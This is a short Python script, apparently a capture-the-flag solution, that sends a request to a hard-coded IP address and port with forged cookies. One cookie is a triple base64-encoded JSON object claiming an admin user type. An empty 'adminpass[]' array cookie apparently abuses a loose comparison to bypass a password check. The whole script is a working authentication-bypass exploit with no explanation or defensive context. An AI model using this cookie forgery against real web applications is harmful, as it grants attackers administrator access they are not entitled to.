#!/bin/env python
import requests
from base64 import b64encode,b64decode

url = "http://131.114.59.19:9002"

user_str = b'{"id":"2","type":"admin"}'

cookies_dict = dict()
cookies_dict["adminpass[]"] = ''
cookies_dict["cookiez"] = b64encode(b64encode(b64encode(user_str))).decode()

r = requests.get(url, cookies=cookies_dict)
print(r.text)
